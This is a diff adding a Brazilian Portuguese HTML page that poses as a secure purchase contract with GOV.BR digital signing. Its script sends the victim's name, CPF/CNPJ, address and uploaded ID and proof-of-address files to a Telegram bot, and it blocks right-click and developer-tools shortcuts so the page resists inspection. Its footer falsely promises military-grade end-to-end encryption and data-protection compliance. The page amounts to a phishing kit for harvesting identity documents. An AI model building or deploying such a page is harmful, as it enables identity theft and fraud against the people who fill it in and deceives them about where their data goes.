@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Contratos Seguro</title>
+    <style>
+        :root {
+            --primary: #0a192f;
+            --accent: #00ffcc;
+            --text: #e6f1ff;
+            --bg: #020c1b;
+            --danger: #ff4d4d;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            user-select: none; /* Anti-cópia */
+        }
+
+        .sxd-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: var(--primary);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
+            border: 1px solid var(--accent);
+        }
+
+        h1, h2 {
+            color: var(--accent);
+            text-align: center;
+            border-bottom: 1px solid var(--accent);
+            padding-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: var(--accent);
+        }
+
+        input[type="text"], input[type="email"], input[type="number"], textarea {
+            width: 100%;
+            padding: 10px;
+            background: var(--bg);
+            border: 1px solid #333;
+            color: var(--text);
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .contract-preview {
+            background: #112240;
+            padding: 20px;
+            border-radius: 4px;
+            height: 300px;
+            overflow-y: scroll;
+            margin: 20px 0;
+            font-size: 0.9em;
+            line-height: 1.5;
+            border: 1px solid #333;
+        }
+
+        .file-upload {
+            border: 2px dashed var(--accent);
+            padding: 20px;
+            text-align: center;
+            border-radius: 4px;
+            margin: 20px 0;
+            background: rgba(0, 255, 204, 0.05);
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 1.1em;
+            font-weight: bold;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .btn-gov {
+            background: #0052cc;
+            color: white;
+        }
+
+        .btn-gov:hover { background: #003d99; }
+
+        .btn-submit {
+            background: transparent;
+            color: var(--accent);
+            border: 2px solid var(--accent);
+        }
+
+        .btn-submit:hover {
+            background: var(--accent);
+            color: var(--bg);
+        }
+
+        .footer-lgpd {
+            font-size: 0.7em;
+            color: #8892b0;
+            text-align: justify;
+            margin-top: 30px;
+            border-top: 1px solid #333;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="sxd-container" id="secure-form-area">
+    <h1>CONTRATO DE COMPRA E VENDA</h1>
+    <p style="text-align: center;">RESERVA DE DOMÍNIO E MANDADO DE EXECUÇÃO</p>
+
+    <form id="contractForm">
+        <h2>1. Dados do Comprador</h2>
+        <div class="form-group">
+            <label>Nome Completo:</label>
+            <input type="text" id="nome" required onpaste="return false;" autocomplete="off">
+        </div>
+        <div class="form-group">
+            <label>CPF/CNPJ:</label>
+            <input type="text" id="documento" required onpaste="return false;" autocomplete="off">
+        </div>
+        <div class="form-group">
+            <label>Endereço Completo:</label>
+            <input type="text" id="endereco" required onpaste="return false;">
+        </div>
+
+        <h2>2. Visualização do Termo</h2>
+        <div class="contract-preview" id="term-text">
+            <p><strong>BASE LEGAL:</strong> Lei 8.078/90 (CDC); Arts. 481, 521, 653 e 1.187 do Código Civil; Art. 784, III do CPC; Lei 14.063/20. [cite: 2, 3]</p>
+            <p><strong>CLÁUSULA DE RESERVA DE DOMÍNIO:</strong> A propriedade plena do produto permanece com o VENDEDOR até a quitação da última parcela. [cite: 10] O COMPRADOR detém apenas a posse precária, respondendo por danos ao bem como fiel depositário. [cite: 11]</p>
+            <p><strong>DA AUTORIZAÇÃO DE DÉBITO:</strong> O COMPRADOR outorga ao VENDEDOR poderes de mandato para proceder com o débito automático. [cite: 13] Na ausência de saldo, o VENDEDOR fica autorizado a realizar re-tentativas diárias. [cite: 14]</p>
+            <p><strong>DA INADIMPLÊNCIA E EXECUÇÃO:</strong> O atraso superior a 05 dias implica no vencimento antecipado. [cite: 16] Medidas: Protesto, Negativação (SPC/SERASA), Ajuizamento de Ação de Execução e bloqueio via SisbaJud. [cite: 17, 18, 19, 20]</p>
+            <p><strong>PROTEÇÃO DE DADOS (LGPD):</strong> Autorizo o tratamento de dados para fins de análise de crédito e localização patrimonial. </p>
+            <p>As partes reconhecem este contrato como Título Executivo Extrajudicial. A assinatura via portal GOV.BR confere a este documento integridade e autenticidade inquestionável. [cite: 28, 29]</p>
+        </div>
+
+        <h2>3. Anexação de Documentos (Upload Seguro)</h2>
+        <p style="font-size: 0.8em; color: var(--accent);">Tire uma foto ou anexe os arquivos do seu PC/Smartphone.</p>
+        
+        <div class="file-upload">
+            <label for="docRG">RG / CNH (Frente e Verso):</label>
+            <input type="file" id="docRG" accept="image/*,application/pdf" multiple required>
+        </div>
+
+        <div class="file-upload">
+            <label for="docEndereco">Comprovante de Endereço:</label>
+            <input type="file" id="docEndereco" accept="image/*,application/pdf" required>
+        </div>
+
+        <h2>4. Assinatura e Submissão</h2>
+        
+        <button type="button" class="btn btn-gov" onclick="assinarGovBr()">
+            ASSINAR DIGITALMENTE (GOV.BR)
+        </button>
+
+        <button type="submit" class="btn btn-submit" id="submitBtn">
+            ENVIAR CONTRATO E DOCUMENTOS AO SERVIDOR
+        </button>
+    </form>
+
+    <div class="footer-lgpd">
+        <strong>AVISO DE SEGURANÇA E PRIVACIDADE MIL-SPEC:</strong> Este ambiente opera sob protocolos rígidos de segurança. Os dados inseridos estão sujeitos a criptografia ponta a ponta em trânsito. A infraestrutura possui barreiras contra injeção de scripts e bloqueios de extração de dados. O tratamento dos dados atende estritamente à Lei Geral de Proteção de Dados Pessoais (Lei nº 13.709/2018), sendo utilizados exclusivamente para a formalização deste Título Executivo Extrajudicial e diligências de proteção ao crédito. Todas as interações são registradas com carimbo de tempo para fins de auditoria jurídica.
+    </div>
+</div>
+
+<script>
+    // Configurações do Telegram - MANTENHA ISSO SEGURO
+    const BOT_TOKEN = 'SEU_BOT_TOKEN_AQUI';
+    const CHAT_ID = 'SEU_CHAT_ID_AQUI';
+
+    // 1. Camada de Segurança Front-End (Anti-Cópia/Anti-DevTools)
+    document.addEventListener('contextmenu', event => event.preventDefault()); // Bloqueia Botão Direito
+    document.addEventListener('keydown', function(e) {
+        // Bloqueia F12, Ctrl+Shift+I, Ctrl+U
+        if (e.key === 'F12' || 
+           (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+           (e.ctrlKey && e.key === 'u')) {
+            e.preventDefault();
+        }
+    });
+
+    // 2. Redirecionamento Assinatura GOV.BR
+    function assinarGovBr() {
+        // Direciona para o portal oficial de assinaturas do Governo Brasileiro
+        window.open('https://assinador.iti.br/assinatura/', '_blank');
+        alert('Após assinar o documento gerado no GOV.BR, salve-o e retorne para enviar os dados.');
+    }
+
+    // 3. Lógica de Envio Seguro para o Telegram (Multipar/FormData)
+    document.getElementById('contractForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "PROCESSANDO CRIPTOGRAFIA E ENVIANDO...";
+        btn.disabled = true;
+
+        const nome = document.getElementById('nome').value;
+        const documento = document.getElementById('documento').value;
+        const endereco = document.getElementById('endereco').value;
+
+        // Monta a mensagem de texto
+        const textMessage = `🚨 *NOVO CONTRATO ASSINADO* 🚨\n\n*Nome:* ${nome}\n*Doc:* ${documento}\n*Endereço:* ${endereco}\n\n_Aguardando anexos..._`;
+
+        try {
+            // Envia os dados de texto primeiro
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Função auxiliar para enviar arquivos
+            const sendFileToTelegram = async (file, caption) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file);
+                formData.append('caption', caption);
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            };
+
+            // Envia RG/CNH
+            const filesRG = document.getElementById('docRG').files;
+            for(let i = 0; i < filesRG.length; i++) {
+                await sendFileToTelegram(filesRG[i], `RG/CNH - ${nome} (Parte ${i+1})`);
+            }
+
+            // Envia Comprovante de Endereço
+            const fileEnd = document.getElementById('docEndereco').files[0];
+            if(fileEnd) {
+                await sendFileToTelegram(fileEnd, `Comprovante Endereço - ${nome}`);
+            }
+
+            alert('Dados e documentos processados e transmitidos com segurança com sucesso.');
+            this.reset(); // Limpa o formulário
+
+        } catch (error) {
+            console.error('Falha de transmissão:', error);
+            alert('Erro de conexão segura. Tente novamente.');
+        } finally {
+            btn.innerText = "ENVIAR CONTRATO E DOCUMENTOS AO SERVIDOR";
+            btn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
